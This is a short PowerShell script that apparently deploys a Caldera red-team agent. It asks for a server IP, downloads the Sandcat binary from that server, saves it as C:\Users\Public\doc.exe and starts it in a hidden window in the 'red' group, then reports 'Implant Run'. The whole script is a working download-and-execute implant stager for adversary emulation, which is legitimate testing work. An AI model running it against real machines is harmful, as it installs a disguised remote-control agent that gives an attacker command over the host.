$calderaDomain = Read-Host -Prompt 'Input the IP of the caldera server'
$calderaDomain = $calderaDomain.trim()
$server="http://$calderaDomain";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);$name="doc";get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-process -f;rm -force "C:\Users\Public\$name.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;

write-host "Implant Run"
$procCaldera = Get-Process doc
  Get-Process doc | fl Path, Id, StartTime